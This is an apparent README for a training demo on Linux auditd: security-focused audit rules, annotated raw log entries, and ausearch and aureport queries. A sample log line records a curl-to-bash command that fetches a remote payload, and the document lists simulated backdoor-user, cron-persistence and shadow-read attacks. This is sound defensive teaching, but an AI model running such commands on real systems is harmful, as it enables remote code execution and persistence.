# Demo 03: Linux auditd — Kernel-Level Security Auditing

## Overview

This demo uses a **real Linux Docker container** with `auditd` installed and configured with security-focused rules.
We trigger various suspicious activities and examine the resulting audit log entries.

**What you will learn:**

* How to configure auditd rules for security monitoring
* How to read and parse raw audit.log entries
* How to use `ausearch` and `aureport` for analysis
* Common Linux attack patterns and their audit signatures

**Time required:** 30 minutes

**Prerequisites:** Docker installed, Linux host (auditd requires kernel audit subsystem)

> **Note:** This demo requires running the container with `--privileged` or specific capabilities (`CAP_AUDIT_CONTROL`, `CAP_AUDIT_WRITE`) to use the kernel's audit subsystem. If your environment does not support this, the pre-generated `audit.log.sample` file contains realistic examples for analysis.

---

## Files

```text
demo-03-linux-auditd/
├── docker-compose.yml
├── Dockerfile
├── audit.rules               ← security-focused auditd rules
├── simulate_attacks.sh       ← triggers events that auditd will capture
├── analyze_audit.py          ← parses and analyzes audit.log
├── audit.log.sample          ← pre-generated sample (use when privileged mode unavailable)
└── README.md                 ← this file
```

---

## Part 1: The audit.rules File

Our demo uses the following security-focused rules:

```bash
# ============================================================
# Demo 03: auditd Security Rules
# ============================================================

# Control: set buffer size and failure mode
-b 8192
-f 1

# --- Identity/Authentication Changes ---
-w /etc/passwd -p wa -k identity
-w /etc/group -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/gshadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d/ -p wa -k sudoers

# --- SSH Configuration ---
-w /etc/ssh/sshd_config -p wa -k sshd_config
-w /root/.ssh/ -p wa -k ssh_keys
-w /home/ -p rwa -k home_ssh

# --- Privileged Command Execution ---
-w /usr/bin/sudo -p x -k privesc
-w /usr/bin/su -p x -k privesc
-w /usr/bin/passwd -p x -k passwd_change

# --- Cron Jobs ---
-w /etc/cron.d/ -p wa -k cron
-w /etc/cron.daily/ -p wa -k cron
-w /etc/crontab -p wa -k cron
-w /var/spool/cron/ -p wa -k cron

# --- Systemd Services ---
-w /etc/systemd/system/ -p wa -k systemd_unit
-w /usr/lib/systemd/system/ -p wa -k systemd_unit

# --- Kernel Module Loading ---
-w /sbin/insmod -p x -k modules
-w /sbin/modprobe -p x -k modules
-w /sbin/rmmod -p x -k modules

# --- System Call Monitoring ---
# Track all execve() calls (program execution) — 64-bit
-a always,exit -F arch=b64 -S execve -k exec_64bit
# Track execve() — 32-bit (on 64-bit systems)
-a always,exit -F arch=b32 -S execve -k exec_32bit

# Track network connections
-a always,exit -F arch=b64 -S connect -k network_connect
-a always,exit -F arch=b64 -S accept -k network_accept

# Track privilege escalation attempts
-a always,exit -F arch=b64 -S setuid -S setgid -k privesc_syscall

# Track directory traversal / sensitive reads
-a always,exit -F arch=b64 -S open -F path=/etc/passwd -F perm=r -k passwd_read
-a always,exit -F arch=b64 -S open -F path=/etc/shadow -F perm=r -k shadow_read

# --- Lock the configuration (immutable) ---
-e 2
```

**Rule syntax breakdown:**

```text
-w /etc/passwd     Watch this FILE/DIRECTORY
-p wa              Permissions: w=write, r=read, x=execute, a=attribute change
-k identity        Key: search tag for ausearch

-a always,exit     Add rule; log on syscall EXIT
-F arch=b64        Filter: 64-bit processes only
-S execve          System call: execve()
-k exec_64bit      Search key

-e 2               Lock mode: config is immutable until reboot
```

---

## Part 2: Running the Demo

```console
# Option A: Full demo with real auditd (requires privileged mode)
docker-compose up --build

# Option B: Analyze pre-generated logs (no special privileges needed)
docker-compose run auditd-demo python3 analyze_audit.py --file /app/audit.log.sample
```

---

## Part 3: Understanding Raw Audit Log Entries

### Example 1: SSH Login (Successful)

```text
type=USER_AUTH msg=audit(1710506401.123:4521): pid=12345 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=pam_unix acct="jdoe" exe="/usr/sbin/sshd" hostname=10.10.5.22 addr=10.10.5.22 terminal=ssh res=success'
type=USER_LOGIN msg=audit(1710506401.456:4522): pid=12345 uid=0 auid=1000 ses=1 msg='op=login id=1000 exe="/usr/sbin/sshd" hostname=10.10.5.22 addr=10.10.5.22 terminal=/dev/pts/0 res=success'
```

**Key fields:**

* `msg=audit(EPOCH.MS:SEQUENCE)` — timestamp and sequence
* `auid=1000` — audit UID (login identity); `4294967295` = not set
* `res=success` — operation result
* `hostname=10.10.5.22` — source IP address

### Example 2: Failed SSH Login (Brute Force)

```text
type=USER_AUTH msg=audit(1710506355.001:4500): pid=12300 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="root" exe="/usr/sbin/sshd" hostname=185.234.219.47 addr=185.234.219.47 terminal=ssh res=failed'
type=USER_AUTH msg=audit(1710506356.001:4501): pid=12301 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="admin" exe="/usr/sbin/sshd" hostname=185.234.219.47 addr=185.234.219.47 terminal=ssh res=failed'
type=USER_AUTH msg=audit(1710506357.001:4502): pid=12302 uid=0 auid=4294967295 ses=4294967295 msg='op=PAM:authentication grantors=? acct="ubuntu" exe="/usr/sbin/sshd" hostname=185.234.219.47 addr=185.234.219.47 terminal=ssh res=failed'
```

**Pattern:** Multiple failed auths from `185.234.219.47` in rapid succession = brute force.

### Example 3: Command Execution (execve syscall)

```text
type=SYSCALL msg=audit(1710506450.234:4600): arch=c000003e syscall=59 success=yes exit=0 a0=55a1b2c3d4e0 a1=55a1b2c3d500 a2=55a1b2c3d520 a3=0 items=2 ppid=12345 pid=12346 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="bash" exe="/bin/bash" subj=unconfined key="exec_64bit"

type=EXECVE msg=audit(1710506450.234:4600): argc=3 a0="bash" a1="-c" a2="curl http://185.234.219.47/payload.sh | bash"

type=CWD msg=audit(1710506450.234:4600): cwd="/root"

type=PATH msg=audit(1710506450.234:4600): item=0 name="/bin/bash" inode=131073 dev=fd:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
```

**Breaking this down:**

* `syscall=59` → execve() (program execution)
* `ppid=12345 pid=12346` → parent/child relationship
* `auid=1000` → logged-in user (even after sudo, this tracks original user)
* `uid=1000 euid=0` → running as root (effective UID=0) via sudo
* `EXECVE` record shows `a0`, `a1`, `a2` = argv[0], argv[1], argv[2]

* The command: `bash -c "curl http://185.234.219.47/payload.sh | bash"` — **CRITICAL RED FLAG**

### Example 4: /etc/passwd Modified

```text
type=SYSCALL msg=audit(1710506500.123:4700): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7fff1234 a2=441 a3=1b6 items=2 ppid=12345 pid=12347 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="useradd" exe="/usr/sbin/useradd" key="identity"

type=PATH msg=audit(1710506500.123:4700): item=1 name="/etc/passwd" inode=131074 dev=fd:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
```

**Pattern:** `useradd` (or any process with UID=0) opened `/etc/passwd` for writing → identity change.

### Example 5: Cron Job Added

```text
type=SYSCALL msg=audit(1710506600.234:4800): arch=c000003e syscall=257 success=yes exit=4 a0=ffffff9c a1=7fff5678 a2=441 a3=1b6 items=2 ppid=12350 pid=12351 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="bash" exe="/bin/bash" key="cron"

type=PATH msg=audit(1710506600.234:4800): item=1 name="/var/spool/cron/crontabs/jdoe" inode=131080 dev=fd:01 mode=0100600 ouid=1000 ogid=1001 rdev=00:00 nametype=NORMAL
```

**Pattern:** User `jdoe` (auid=1000) modified their crontab — investigate what was added.

---

## Part 4: Using ausearch

```bash
# Search by key (rule tag)
ausearch -k exec_64bit | head -50
ausearch -k identity
ausearch -k cron
ausearch -k ssh_keys

# Search by time range
ausearch --start today

# Search by user (login UID)
ausearch -ua 1000

# Search by hostname (source IP for SSH)
ausearch --node 185.234.219.47

# Search by executable
ausearch -x /bin/bash

# Show raw + interpreted output
ausearch -k exec_64bit -i | head -100
```

---

## Part 5: Using aureport

```bash
# Overall summary
aureport --summary

# Authentication report
aureport --auth

# Failed events
aureport --failed

# Executable events (what ran)
aureport --executable

# Login report
aureport --login

# User account modifications
aureport --mods

# Network events
aureport --network
```

---

## Simulated Attack Scenarios

When you run `simulate_attacks.sh`, the following activities are triggered:

1. **Read /etc/shadow** (unauthorized access attempt)
1. **Create a new backdoor user**
1. **Add a cron job** for persistence

1. **Execute a suspicious curl | bash** command

1. **Modify SSH authorized_keys**
1. **Load a kernel module** (simulated)

All of these will be captured by the audit rules and visible in `audit.log`.

---

## Key Takeaways

1. **auditd is kernel-level** — unlike user-space logging, it's much harder for attackers to evade.

1. **The `auid` field is golden** — it tracks the original login identity even through `sudo`/`su`. An attacker who gains root via sudo will still have their original UID recorded.

1. **EXECVE records reconstruct the full command** — the a0, a1, a2... fields are argv[0], argv[1], argv[2]... Concatenate them to reconstruct the command.

1. **Key tags enable targeted searching** — proper `-k` tags make `ausearch -k privilege_escalation` find relevant events instantly.

1. **Immutable mode (`-e 2`)** prevents an attacker with root from disabling auditing until the next reboot.
